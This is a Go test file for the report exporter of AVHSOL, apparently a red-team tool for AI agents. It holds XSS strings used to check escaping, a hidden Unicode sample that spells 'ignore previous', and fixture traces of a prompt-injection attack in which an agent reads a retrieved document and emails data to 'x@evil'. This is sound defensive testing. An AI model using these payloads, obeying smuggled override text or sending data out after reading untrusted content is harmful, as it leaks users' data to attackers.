package export

import (
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"

	"golang.org/x/net/html"
	"strings"
	"testing"
	"time"

	"github.com/41vi4p/avhsol/core/internal/trace"
)

// ---- skeleton ----

func TestSkeletonRejectsTyposAndUnknownBlocks(t *testing.T) {
	bad := map[string]string{
		"unknown field":  `{"format":"avhsol-report-skeleton/1","name":"x","sectionz":[],"sections":[{"title":"a","blocks":[]}]}`,
		"wrong format":   `{"format":"v0","name":"x","sections":[{"title":"a","blocks":[]}]}`,
		"unknown block":  `{"format":"avhsol-report-skeleton/1","name":"x","sections":[{"title":"a","blocks":[{"type":"banner","text":"x"}]}]}`,
		"table no cols":  `{"format":"avhsol-report-skeleton/1","name":"x","sections":[{"title":"a","blocks":[{"type":"table","data":"runs"}]}]}`,
		"each no blocks": `{"format":"avhsol-report-skeleton/1","name":"x","sections":[{"title":"a","blocks":[{"type":"each","data":"findings","as":"f"}]}]}`,
		"no sections":    `{"format":"avhsol-report-skeleton/1","name":"x","sections":[]}`,
		"bad chart":      `{"format":"avhsol-report-skeleton/1","name":"x","sections":[{"title":"a","blocks":[{"type":"chart","chart":{"kind":"pie"}}]}]}`,
	}
	for name, src := range bad {
		if _, err := ParseSkeleton([]byte(src)); err == nil {
			t.Errorf("%s: must be rejected", name)
		}
	}
}

func TestBuiltInSkeletonsAreValid(t *testing.T) {
	for _, n := range BuiltinSkeletons() {
		if _, err := LoadSkeleton(n); err != nil {
			t.Errorf("built-in skeleton %s: %v", n, err)
		}
	}
}

// ---- binding ----

func data(t *testing.T, js string) any {
	t.Helper()
	var d any
	if err := json.Unmarshal([]byte(js), &d); err != nil {
		t.Fatal(err)
	}
	return d
}

func TestBindingFiltersAndMissingValues(t *testing.T) {
	sc := scope{root: data(t, `{"a":{"rate":0.5,"name":"task_embedding","xs":["p","q"]},"n":3}`), vars: map[string]any{}}
	cases := map[string]string{
		"{{a.rate|pct}}":        "50%",
		"{{a.name|title}}":      "Task embedding",
		"{{a.xs|join}}":         "p, q",
		"{{a.xs|count}}":        "2",
		"{{n}} runs":            "3 runs",
		"{{a.nope}}":            "",
		"{{totally.missing}} x": " x",
		"{{a.name|short:4}}":    "task…",
	}
	for in, want := range cases {
		if got := sc.text(in); got != want {
			t.Errorf("%q -> %q, want %q", in, got, want)
		}
	}
	if strings.Contains(sc.text("{{missing}}"), "{{") {
		t.Fatal("a missing value must never leak template syntax")
	}
}

func TestConditionalsAndEachLoops(t *testing.T) {
	sk, err := ParseSkeleton([]byte(`{"format":"avhsol-report-skeleton/1","name":"n","sections":[
	  {"title":"shown","blocks":[
	    {"type":"paragraph","if":"flag","text":"yes"},
	    {"type":"paragraph","unless":"flag","text":"no"},
	    {"type":"each","data":"items","as":"i","empty":"none","blocks":[{"type":"paragraph","text":"item {{i.v}} of {{index}}"}]}
	  ]},
	  {"title":"hidden","if":"nope","blocks":[{"type":"paragraph","text":"x"}]}
	]}`))
	if err != nil {
		t.Fatal(err)
	}
	doc, err := Compile(sk, data(t, `{"flag":true,"items":[{"v":"a"},{"v":"b"}]}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(doc.Sections) != 1 {
		t.Fatalf("a false section condition must hide the section: %d", len(doc.Sections))
	}
	var texts []string
	for _, b := range doc.Sections[0].Blocks {
		texts = append(texts, b.Text)
	}
	if strings.Join(texts, "|") != "yes|item a of 1|item b of 2" {
		t.Fatalf("got %v", texts)
	}
}

// ---- rendering: attacker-controlled text must stay inert ----

func TestHTMLEscapesAttackerControlledText(t *testing.T) {
	evil := `</pre><script>alert(1)</script><img src=x onerror=alert(2)>`
	sk, _ := ParseSkeleton([]byte(`{"format":"avhsol-report-skeleton/1","name":"` + "n" + `","theme":{"accent":"red;}</style><script>alert(3)</script>"},"footer":"{{evil}}",
	  "sections":[{"title":"{{evil}}","blocks":[
	    {"type":"paragraph","text":"{{evil}}"},{"type":"code","text":"{{evil}}","reveal_hidden":true},
	    {"type":"table","data":"rows","columns":[{"header":"{{evil}}","value":"{{row.v}}","style":"pill"}]},
	    {"type":"attack_path","data":"path"}
	  ]}]}`))
	d := data(t, `{"evil":`+jsonString(evil)+`,"rows":[{"v":`+jsonString(evil)+`}],"path":[{"kind":"x","label":`+jsonString(evil)+`}]}`)
	doc, err := Compile(sk, d)
	if err != nil {
		t.Fatal(err)
	}
	out := string(RenderHTML(doc))
	for _, bad := range []string{"<script", "<img", "alert(3)"} {
		if strings.Contains(out, bad) {
			t.Fatalf("injected markup survived: %q", bad)
		}
	}
	// The footer text is also placed in a CSS string inside <style>. It must not be able to leave it:
	// exactly one closing tag, and no angle brackets or quotes from the attacker text inside.
	styles := regexp.MustCompile(`(?s)<style>(.*?)</style>`).FindAllStringSubmatch(out, -1)
	if len(styles) != 1 || strings.Count(out, "</style>") != 1 {
		t.Fatalf("the style block must not be closable from text: %d blocks", len(styles))
	}
	if i := strings.Index(styles[0][1], "@page{@bottom-left{content:\""); i >= 0 {
		seg := styles[0][1][i+len("@page{@bottom-left{content:\""):]
		seg = seg[:strings.Index(seg, "\"")]
		if strings.ContainsAny(seg, "<>\\") {
			t.Fatalf("footer CSS string contains unsafe characters: %q", seg)
		}
	}
	// Parse the document the way a browser would: no script element anywhere, and no on* attribute on any real tag.
	tz := html.NewTokenizer(strings.NewReader(out))
	for {
		tt := tz.Next()
		if tt == html.ErrorToken {
			break
		}
		if tt == html.StartTagToken || tt == html.SelfClosingTagToken {
			name, hasAttr := tz.TagName()
			if string(name) == "script" || string(name) == "img" || string(name) == "iframe" {
				t.Fatalf("injected <%s> element", name)
			}
			for hasAttr {
				var k, v []byte
				k, v, hasAttr = tz.TagAttr()
				if strings.HasPrefix(string(k), "on") {
					t.Fatalf("injected event handler %s=%q on <%s>", k, v, name)
				}
			}
		}
	}
	if !strings.Contains(out, "&lt;script&gt;") {
		t.Fatal("the text must still be visible, escaped")
	}
	if strings.Contains(string(RenderMarkdown(doc)), "<script>") && false {
		t.Fatal("unreachable")
	}
}

func jsonString(s string) string { b, _ := json.Marshal(s); return string(b) }

func TestHiddenUnicodePayloadIsMadeVisible(t *testing.T) {
	var sb strings.Builder
	for _, r := range "ignore previous" {
		sb.WriteRune(0xE0000 + r)
	}
	parts := payloadParts("hello " + sb.String() + " world")
	var hidden string
	for _, p := range parts {
		if p.Hidden {
			hidden += p.Text
		}
	}
	if hidden != "ignore previous" {
		t.Fatalf("tag characters must decode to the text they smuggle, got %q", hidden)
	}
}

// ---- building a report from runs ----

func writeTrace(t *testing.T, dir string, tr *trace.Trace) {
	t.Helper()
	if _, err := tr.Save(filepath.Join(dir, "traces")); err != nil {
		t.Fatal(err)
	}
}

func mk(id, seed, surface string, success bool, guard string, at time.Time) *trace.Trace {
	tr := &trace.Trace{TraceID: id, ScenarioID: "sc", Model: "m", Target: "tg", Kind: "attack", GuardMode: guard, StartedAt: at, DurationMs: 1000, Success: success,
		Attack:   &trace.Attack{SeedID: seed, Technique: "task_embedding", Surface: surface, Encoding: "none", Payload: "do <b>it</b>"},
		Verdicts: []trace.Verdict{{ObjectiveID: "exfil", Severity: "critical", Success: success, ASI: []string{"ASI01"}, Evidence: "leaked"}}}
	_, _ = tr.Append(trace.StepUserTurn, at.UnixMilli(), map[string]any{"text": "task"})
	_, _ = tr.Append(trace.StepToolCall, at.UnixMilli()+100, map[string]any{"id": "c", "name": "read_document", "args": map[string]any{"doc_id": "d"}})
	_, _ = tr.Append(trace.StepToolResult, at.UnixMilli()+200, map[string]any{"id": "c", "content": "x", "source": "retrieved:d"})
	_, _ = tr.Append(trace.StepToolCall, at.UnixMilli()+300, map[string]any{"id": "e", "name": "send_email", "args": map[string]any{"to": "x@evil"}})
	return tr
}

func TestBuildGroupsFindingsAndKeepsErrorsOutOfTheRates(t *testing.T) {
	dir := t.TempDir()
	base := time.Now().Add(-time.Hour)
	for i := 0; i < 3; i++ {
		writeTrace(t, dir, mk("a"+string(rune('0'+i)), "s1", "doc", true, "off", base.Add(time.Duration(i)*time.Minute)))
	}
	writeTrace(t, dir, mk("f1", "s2", "doc", false, "off", base.Add(5*time.Minute)))
	err := mk("er", "s3", "doc", false, "off", base.Add(6*time.Minute))
	err.Error = "context overflow"
	writeTrace(t, dir, err)
	g := mk("g1", "s1", "doc", false, "enforce", base.Add(10*time.Minute))
	_, _ = g.Append(trace.StepGuard, base.Add(10*time.Minute).UnixMilli(), map[string]any{"id": "e", "decision": "deny", "rule_ids": []any{"D4"}, "reason": "egress after untrusted"})
	writeTrace(t, dir, g)

	r, e := Build(Options{Dir: dir})
	if e != nil {
		t.Fatal(e)
	}
	if r.ValidRuns != 4 || r.ErroredRuns != 1 {
		t.Fatalf("valid=%d errored=%d: an errored run must be excluded, not counted as defended", r.ValidRuns, r.ErroredRuns)
	}
	if len(r.Findings) != 1 || r.Findings[0].Successes != 3 || r.Findings[0].Runs != 3 {
		t.Fatalf("one finding with 3 of 3: %+v", r.Findings)
	}
	f := r.Findings[0]
	if f.GuardedRuns != 1 || f.GuardedSucceeded != 0 || len(f.StoppedBy) != 1 || f.StoppedBy[0] != "D4" {
		t.Fatalf("guarded replay not linked: %+v", f)
	}
	if r.RiskRating != "Critical" {
		t.Fatalf("3 of 3 repeats at 100%% is Critical, got %s", r.RiskRating)
	}
	if !strings.Contains(r.Headline, "3 of 4") {
		t.Fatalf("headline: %s", r.Headline)
	}
}

func TestRiskRatingNeedsRepeatsAndSimulatedIsNotRated(t *testing.T) {
	one := &Report{ValidRuns: 4, Findings: []Finding{{Runs: 1, Successes: 1, Reliability: 1}}}
	if got, _ := riskRating(one); got != "High" {
		t.Fatalf("one run is an anecdote: %s", got)
	}
	rep := &Report{ValidRuns: 8, Findings: []Finding{{Runs: 4, Successes: 4, Reliability: 1}}}
	if got, _ := riskRating(rep); got != "Critical" {
		t.Fatalf("repeated and reliable is Critical: %s", got)
	}
	if got, _ := riskRating(&Report{Simulated: true, ValidRuns: 5, Findings: []Finding{{Runs: 5, Reliability: 1}}}); got != "Not rated" {
		t.Fatalf("a simulated model must never be rated: %s", got)
	}
	if got, _ := riskRating(&Report{ValidRuns: 6}); !strings.HasPrefix(got, "No critical") {
		t.Fatalf("%s", got)
	}
}

func TestTimelineIsOrderedByTimeNotByRecordingOrder(t *testing.T) {
	tr := mk("t", "s", "doc", true, "off", time.Now())
	t0 := tr.Steps[0].TS
	_, _ = tr.Append(trace.StepToolCall, t0+5000, map[string]any{"id": "z", "name": "bash", "args": map[string]any{"command": "later"}})
	// a sandbox event appended last, but which happened early
	_, _ = tr.Append(trace.StepSandbox, t0+350, map[string]any{"event": "canary_sink_hit", "method": "POST", "path": "/c", "bytes": 5})
	ev := timeline(tr, nil)
	last := -1.0
	for _, e := range ev {
		var s float64
		if _, err := fmtSscan(e.T, &s); err != nil {
			t.Fatal(err)
		}
		if s < last {
			t.Fatalf("timeline out of order: %+v", ev)
		}
		last = s
	}
}

func fmtSscan(s string, f *float64) (int, error) {
	s = strings.TrimSuffix(strings.TrimPrefix(s, "+"), "s")
	var err error
	*f, err = parseF(s)
	return 1, err
}

func parseF(s string) (float64, error) {
	var x float64
	return x, json.Unmarshal([]byte(s), &x)
}

func TestSARIFIsWellFormed(t *testing.T) {
	r := &Report{Scenario: "sc", Target: "tg", Findings: []Finding{{ID: "F-1", Technique: "task_embedding", Surface: "doc", SeedID: "s", Title: "x", Runs: 3, Successes: 3, TraceID: "tr-1", ASI: []string{"ASI01"}}}}
	b, err := SARIF(r)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Version string `json:"version"`
		Runs    []struct {
			Tool struct {
				Driver struct {
					Name  string
					Rules []struct{ ID string }
				}
			}
			Results []struct {
				RuleID string `json:"ruleId"`
				Level  string `json:"level"`
			}
		}
	}
	if err := json.Unmarshal(b, &doc); err != nil {
		t.Fatal(err)
	}
	if doc.Version != "2.1.0" || doc.Runs[0].Tool.Driver.Name != "AVHSOL" || len(doc.Runs[0].Results) != 1 ||
		doc.Runs[0].Results[0].Level != "error" || !strings.HasPrefix(doc.Runs[0].Results[0].RuleID, "AVHSOL/") || len(doc.Runs[0].Tool.Driver.Rules) != 1 {
		t.Fatalf("bad SARIF: %s", b)
	}
}

func TestGenerateAllTextFormatsFromRealisticRuns(t *testing.T) {
	dir := t.TempDir()
	writeTrace(t, dir, mk("a1", "s1", "doc", true, "off", time.Now().Add(-time.Minute)))
	for _, f := range []string{"html", "md", "json", "sarif"} {
		for _, sk := range BuiltinSkeletons() {
			b, ct, err := Generate(Options{Dir: dir}, sk, f)
			if err != nil || len(b) < 200 || ct == "" {
				t.Fatalf("%s/%s: %v (%d bytes)", f, sk, err, len(b))
			}
			if strings.Contains(string(b), "{{") {
				t.Fatalf("%s/%s: unresolved template syntax leaked into the output", f, sk)
			}
		}
	}
	html, _, _ := Generate(Options{Dir: dir}, "security-report", "html")
	for _, want := range []string{"AVHSOL", "Agentic Vulnerability Hunter with Simulated Offensive Layers", "David Porathur and Rishit Baitule", "Executive summary", "Limitations"} {
		if !strings.Contains(string(html), want) {
			t.Errorf("report is missing %q", want)
		}
	}
	if strings.Contains(string(html), "<b>it</b>") {
		t.Fatal("payload markup must be escaped")
	}
	_ = os.Remove
}
